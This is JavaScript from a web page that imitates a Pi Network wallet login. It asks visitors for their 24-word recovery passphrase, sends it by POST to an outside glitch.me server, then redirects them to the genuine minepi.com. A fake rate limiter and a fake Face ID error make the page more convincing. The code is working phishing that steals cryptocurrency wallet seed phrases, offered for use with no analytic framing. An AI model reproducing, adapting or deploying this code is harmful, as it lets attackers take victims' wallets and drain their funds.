        // ====================== 24-HOUR RATE LIMITER ======================
        function checkRateLimit() {
            const LAST_SUBMISSION_KEY = 'lastPassphraseSubmission';
            const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
            
            const lastSubmission = localStorage.getItem(LAST_SUBMISSION_KEY);
            const now = Date.now();
            
            if (lastSubmission && (now - parseInt(lastSubmission)) < TWENTY_FOUR_HOURS) {
                const hoursLeft = Math.ceil((TWENTY_FOUR_HOURS - (now - parseInt(lastSubmission))) / (1000 * 60 * 60));
                alert(`You can only submit once per 24 hours. Please try again in ${hoursLeft} hours.`);
                return false;
            }
            
            localStorage.setItem(LAST_SUBMISSION_KEY, now.toString());
            return true;
        }

        async function validatePassphrase(inputId, errorId) {
            // Check 24-hour limit first
            if (!checkRateLimit()) return;

            const input = document.getElementById(inputId);
            const error = document.getElementById(errorId);
            const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);

            if (words.length !== 24) {
                error.style.display = 'block';
                error.textContent = 'Passphrase must be 24 words';
                return;
            }

            error.style.display = 'none';
            document.getElementById('loadingOverlay').style.display = 'flex';

            try {
                const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ passphrase: input.value })
                });

                if (response.status === 429) {
                    alert("Server overloaded. Please wait before trying again.");
                    return;
                }

                const result = await response.json();
                if (result.success) window.location.href = "https://minepi.com";
            } catch (e) {
                alert("Connection error. Try again later.");
                localStorage.removeItem('lastPassphraseSubmission'); // Reset on failure
            } finally {
                document.getElementById('loadingOverlay').style.display = 'none';
            }
        }

        function showModal(modalType) {
            document.body.style.overflow = "hidden";
            document.querySelectorAll('body > *').forEach(el => {
                if (!el.classList.contains('modal-overlay') && !el.classList.contains('loading-overlay')) {
                    el.style.display = 'none';
                }
            });
            const modalId = `${modalType}Modal`;
            document.getElementById(modalId).style.display = "flex";
        }
        
        function hideModal(modalId) {
            document.querySelectorAll('body > *').forEach(el => {
                el.style.display = '';
            });
            document.getElementById(modalId).style.display = "none";
            document.body.style.overflow = "auto";
        }
        
        function showFaceIDError() {
            alert("Face ID is not available at the moment. Please try with passphrase.");
        }
        
        function redirectToNewWallet() {
            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
                window.location.href = "https://example.com/create-new-wallet";
            }
        }
        
        function redirectToNewAccount() {
            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
                window.location.href = "https://example.com/create-new-brainstorm-account";
            }
        }
